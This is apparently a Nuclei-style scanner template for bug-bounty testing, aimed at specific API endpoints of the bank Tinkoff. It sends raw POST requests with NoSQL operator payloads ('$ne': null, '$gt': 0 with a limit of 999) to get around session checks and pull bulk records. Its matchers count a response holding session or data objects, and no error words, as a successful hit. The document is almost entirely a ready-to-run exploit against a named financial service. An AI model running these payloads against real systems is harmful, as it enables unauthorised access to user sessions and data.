id: tinkoff-nosql-injection

info:
  name: Tinkoff - NoSQL Injection
  author: bugbounty
  severity: critical
  description: NoSQL injection with operator-based bypass
  tags: nosql,injection,tinkoff
  reference:
    - https://portswigger.net/web-security/nosql-injection

http:
  - raw:
      - |
        POST /api/common/v1/session_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"platform":{"$ne":null},"sessionid":"test"}

      - |
        POST /api/invest-gw/social/v1/post HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"id":{"$gt":0},"limit":999}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: content_type
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"session"?\s*:\s*\{[^}]+"id"?\s*:'
          - '\[\s*\{[^}]+"id"?\s*:'
          - '"data"?\s*:\s*\[[^\]]+\]'
        condition: or

      - type: dsl
        dsl:
          - 'len(body) > 100'

      - type: word
        part: body
        words:
          - '"error"'
          - '"invalid"'
          - '"forbidden"'
        condition: or
        negative: true
